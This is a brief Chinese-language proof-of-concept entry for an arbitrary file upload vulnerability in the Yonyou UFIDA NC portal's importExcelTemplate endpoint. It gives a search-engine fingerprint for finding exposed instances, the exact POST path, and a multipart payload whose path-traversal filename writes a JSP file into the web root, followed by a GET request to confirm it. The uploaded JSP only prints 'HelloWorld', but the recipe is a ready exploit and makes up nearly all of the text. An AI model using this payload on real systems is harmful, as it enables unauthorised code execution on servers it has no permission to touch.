# 用友NCportal端importExcelTemplate存在文件上传漏洞

用友 ｜ 文件上传 ｜ —
- **指纹**：`app="用友-UFIDA-NC"`
- **请求**：`POST /portal/pt/infopathimport/importExcelTemplate?pageId=login HTTP/1.1`

**Payload**
```
------WebKitFormBoundaryNAL3EsrdN90G1hgq
Content-Disposition: form-data; name="Filedata"; filename="./.\webapps\nc_web\2.jsp"
application/octet-stream
<% out.println("HelloWorld");%>
------WebKitFormBoundaryNAL3EsrdN90G1hgq--
GET /2.jsp HTTP/1.1
Host:
```
- **响应特征**：200